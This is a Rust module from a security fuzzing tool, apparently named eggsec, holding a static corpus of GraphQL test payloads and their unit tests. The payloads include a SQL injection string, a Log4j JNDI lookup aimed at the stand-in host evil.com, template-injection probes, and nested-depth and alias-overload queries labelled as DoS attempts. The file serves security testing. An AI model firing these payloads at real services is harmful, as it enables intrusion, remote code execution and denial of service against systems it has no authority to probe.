#![allow(clippy::vec_init_then_push)]
//! Static GraphQL payload corpus: introspection, injection, depth-bypass and
//! alias-overload payloads.
//!
//! These are **data**. The GraphQL *prober* — `GraphQLFuzzer`, its
//! `run_introspection` and the other live-`reqwest` methods — stays in the
//! `eggsec` engine, in `eggsec::fuzzer::payloads::graphql`. This module owns the
//! strings that prober sends.
//!
//! `generate_depth_limit_bypass` and `generate_alias_overload` are `pub`
//! because the engine's prober builds its query batches from the same
//! generators, so both sides must share one definition of these strings.

use super::{Payload, PayloadType, Severity};

pub fn generate_depth_limit_bypass() -> Vec<String> {
    let mut queries = Vec::new();

    for depth in [5, 10, 15, 20, 30, 50] {
        let mut query = String::from("query {");
        let mut current = String::from("user");

        for i in 0..depth {
            let next = format!("n{i}");
            query.push_str(&format!("{} {{ {} ", current, next));
            current = next;
        }

        query.push_str("id");
        query.push_str(&"}".repeat(depth + 1));

        queries.push(query);
    }

    queries
}

pub fn generate_alias_overload() -> Vec<String> {
    vec![
        r#"{u1:user(id:1){name} u2:user(id:2){name} u3:user(id:3){name} u4:user(id:4){name} u5:user(id:5){name} u6:user(id:6){name} u7:user(id:7){name} u8:user(id:8){name} u9:user(id:9){name} u10:user(id:10){name} u11:user(id:11){name} u12:user(id:12){name} u13:user(id:13){name} u14:user(id:14){name} u15:user(id:15){name} u16:user(id:16){name} u17:user(id:17){name} u18:user(id:18){name} u19:user(id:19){name} u20:user(id:20){name}}"#.to_string(),
        r#"{users{name users{name users{name users{name users{name}}}}}}"#.to_string(),
    ]
}

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    payloads.push(Payload {
        payload_type: PayloadType::GraphQL,
        payload: r#"{__schema{queryType{name}}}"#.to_string(),
        description: "Basic introspection query".to_string(),
        severity: Severity::Info,
        tags: vec!["graphql".to_string(), "introspection".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::GraphQL,
        payload: r#"{__type(name:"User"){fields{name type{name}}}}"#.to_string(),
        description: "Type field enumeration".to_string(),
        severity: Severity::Info,
        tags: vec!["graphql".to_string(), "enum".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::GraphQL,
        payload: "' OR '1'='1".to_string(),
        description: "SQL injection via GraphQL argument".to_string(),
        severity: Severity::Critical,
        tags: vec!["graphql".to_string(), "sqli".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::GraphQL,
        payload: r#"query{user(id:"${jndi:ldap://evil.com/a}"){name}}"#.to_string(),
        description: "Log4j JNDI injection".to_string(),
        severity: Severity::Critical,
        tags: vec![
            "graphql".to_string(),
            "log4j".to_string(),
            "rce".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::GraphQL,
        payload: "{{7*7}}".to_string(),
        description: "Template injection test".to_string(),
        severity: Severity::High,
        tags: vec!["graphql".to_string(), "ssti".to_string()],
    });

    for depth_query in generate_depth_limit_bypass() {
        payloads.push(Payload {
            payload_type: PayloadType::GraphQL,
            payload: depth_query.clone(),
            description: format!(
                "Depth limit bypass (depth: {})",
                depth_query.matches('{').count()
            ),
            severity: Severity::Medium,
            tags: vec![
                "graphql".to_string(),
                "depth-bypass".to_string(),
                "dos".to_string(),
            ],
        });
    }

    for alias_query in generate_alias_overload() {
        payloads.push(Payload {
            payload_type: PayloadType::GraphQL,
            payload: alias_query.clone(),
            description: "Alias overload DoS attempt".to_string(),
            severity: Severity::Medium,
            tags: vec![
                "graphql".to_string(),
                "alias-overload".to_string(),
                "dos".to_string(),
            ],
        });
    }

    payloads.push(Payload {
        payload_type: PayloadType::GraphQL,
        payload: r#"[{"query":"{__schema{queryType{name}}}"},{"query":"{__typename}"}]"#
            .to_string(),
        description: "Batch query bypass".to_string(),
        severity: Severity::Medium,
        tags: vec!["graphql".to_string(), "batch".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::GraphQL,
        payload: r#"mutation{__typename}"#.to_string(),
        description: "Mutation introspection".to_string(),
        severity: Severity::Info,
        tags: vec!["graphql".to_string(), "mutation".to_string()],
    });

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty_and_labelled() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty());
        for p in &payloads {
            assert_eq!(p.payload_type, PayloadType::GraphQL);
            assert!(!p.payload.is_empty());
            assert!(!p.tags.is_empty());
        }
    }

    #[test]
    fn contains_the_canonical_introspection_query() {
        assert!(get_payloads()
            .iter()
            .any(|p| p.payload.contains("__schema") && p.payload.contains("queryType")));
    }

    #[test]
    fn depth_bypass_and_alias_overload_generators_still_nest() {
        // These two are `pub` so the engine's prober shares one definition of
        // them; pin the shape both sides depend on.
        let depth = generate_depth_limit_bypass();
        assert!(
            !depth.is_empty(),
            "depth-limit bypass must generate queries"
        );
        assert!(
            depth.iter().all(|q| q.contains('{')),
            "a depth-bypass query must nest braces"
        );
        let alias = generate_alias_overload();
        assert!(!alias.is_empty(), "alias overload must generate queries");
        assert!(
            alias.iter().all(|q| q.contains('{')),
            "an alias-overload query must be a GraphQL document"
        );
    }
}
